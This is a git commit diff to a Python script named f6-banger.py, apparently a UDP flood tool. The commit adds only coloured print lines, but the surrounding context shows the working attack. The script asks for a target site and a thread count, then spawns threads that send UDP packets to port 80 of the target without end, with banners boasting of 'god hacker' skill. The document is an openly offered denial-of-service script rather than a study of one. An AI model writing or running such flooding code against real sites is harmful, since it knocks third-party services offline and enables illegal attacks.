e7f655c773e3848d3363fa2ac41b1b5275379d9c
ahoorabm <87478449+akjwi@users.noreply.github.com>
2023-04-10 04:01:08 +0330

    Update f6-banger.py

--- f6-banger.py
+++ f6-banger.py
@@ -6,7 +6,9 @@ print("ahoorabm god hacker")
 print("in scripet vaqei hast pas fakesh nakonid thanks")
 print("id sorousham => @ahoorabm va @ahoorabm2 va @ahoorabm3 lets go")
 site = input("Enter your site IP => ")
+print (" "+yellow)
 thread_count = input("Enter your Turbo => ")
+print (" "+yellow)
 ip = socket.gethostbyname(site)
 UDP_PORT = 80
 MESSAGE = 'ahoorabm'
@@ -18,6 +20,7 @@ def ddos(i):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
         print("Packet Sent / f6-banger ahoorabm")
+        print (" "+yellow)
 for i in range(int(thread_count)):
     try:
         _thread.start_new_thread(ddos, ("Thread-" + str(i),))
